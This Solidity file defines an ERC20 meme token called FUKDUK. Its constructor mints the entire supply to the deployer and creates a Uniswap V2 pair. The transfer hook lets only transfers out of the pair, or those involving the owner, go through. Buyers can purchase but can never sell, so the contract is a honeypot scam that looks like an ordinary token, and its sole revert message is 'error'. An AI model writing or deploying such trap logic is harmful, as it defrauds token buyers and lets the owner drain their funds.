// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IUniV2Router {
    function factory() external pure returns (address);
}

interface IUniV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract FUKDUK is Ownable, ERC20 {
    uint256 private constant _total = 696_900_000_000_000 ether;
    address public pair;

    constructor() ERC20("FUKDUK", "FUKDUK") Ownable() {
        address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        pair = IUniV2Factory(IUniV2Router(ROUTER).factory()).createPair(WETH, address(this));
	_mint( msg.sender, _total );
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) override internal virtual {
	if( from != owner() && to != owner() ){ require( from == pair, "error"); }
    }

}